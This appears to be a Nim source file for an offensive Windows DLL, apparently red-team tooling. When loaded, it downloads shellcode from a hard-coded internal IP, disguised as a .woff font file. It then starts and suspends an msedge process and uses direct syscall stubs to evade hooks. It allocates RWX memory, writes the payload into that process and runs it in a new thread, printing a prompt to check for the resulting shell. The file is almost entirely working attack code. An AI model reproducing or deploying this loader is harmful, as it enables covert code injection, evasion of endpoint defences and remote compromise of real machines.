import winim/lean
import httpclient
import strenc
import GetSyscallStub
import osproc

# Unmanaged NTDLL Declarations
type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}

proc NimMain() {.cdecl, importc.}

## Converts a string to the corresponding byte sequence.
proc toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

proc ThreadFunction(shellcode: seq[byte]){.stdcall, winapi.} =

    var SYSCALL_STUB_SIZE: int = 23;

    # The Dll only worked when starting a new process
    let tProcess = startProcess("msedge")
    tProcess.suspend()
    defer: tProcess.close()

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](shellcode.len)

    cid.UniqueProcess = tProcess.processID

    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

    let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)

    var syscallStub_NtAlloc:  HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtWrite:  HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)

    var oldProtection: DWORD = 0

    # define NtOpenProcess
    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP));
    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtAllocateVirtualMemory
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite));
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtCreateThreadEx
    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate));
    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    var status: NTSTATUS
    var success: BOOL
    var bytesWritten: SIZE_T

    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP));
    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate));
    
    status = NtOpenProcess(&pHandle,PROCESS_ALL_ACCESS, &oa, &cid)
    status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE); 
    status = NtWriteVirtualMemory(pHandle, ds, shellcode[0].addr, sc_size-1, addr bytesWritten);
    status = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, NULL, pHandle,ds, NULL, FALSE, 0, 0, 0, NULL);

    echo "Finished: Check for your shell after a few seconds"
    WaitForSingleObject(tHandle, -1)
    CloseHandle(tHandle)

    status = NtClose(tHandle)
    status = NtClose(pHandle)

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
    
    NimMain()

    var client = newHttpClient()
    var url = "http://192.168.32.145:9090/EVENTUAL_GREENHOUSE.woff"
    var response: string = client.getContent(url)
    var shellcode: seq[byte] = toByteSeq(response)
    
    ThreadFunction(shellcode)
    
    return true;